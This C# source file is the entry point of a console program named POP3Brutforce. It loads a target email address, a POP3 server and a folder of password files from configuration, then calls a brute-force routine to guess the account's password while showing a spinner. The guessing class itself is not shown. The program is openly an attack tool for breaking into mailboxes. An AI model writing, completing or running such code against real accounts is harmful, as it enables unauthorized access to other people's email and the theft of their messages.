using Pop3;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Configuration;
using System.Threading.Tasks;

namespace POP3Brutforce
{
    class Program
    {
        static void Main(string[] args)
        {
            string sValue = ConfigurationManager.AppSettings["Directory"];

            if (!Directory.Exists(sValue))
            {
                Console.WriteLine("Directory is not exists {0}", sValue);
                return;
            }

            Console.WriteLine("Read files from {0}", sValue);
            
            var fileNames = Directory.GetFiles(sValue);

            string email = ConfigurationManager.AppSettings["Email"];

            var brutforce = new Brutforce(ConfigurationManager.AppSettings["PopServer"], email, ConfigurationManager.AppSettings["FileLogPath"]);
                
            Console.Write("Email {0} brutfors wait...", email);

            Console.CursorVisible = false;

            var taskShowProcess = new Task(async () =>
            {
                var spin = new ConsoleSpinner();
                while (true)
                {
                    await Task.Yield();

                    spin.Turn();

                    await Task.Delay(500);
                }
            });

            using (taskShowProcess)
            {

                taskShowProcess.Start();

                brutforce.TryFindPasswordFromFilesAsync(fileNames).Wait();

            }

            Console.CursorVisible = true;

            Console.WriteLine("Finish. Press any button.");

            Console.ReadLine();
        }
    }
}
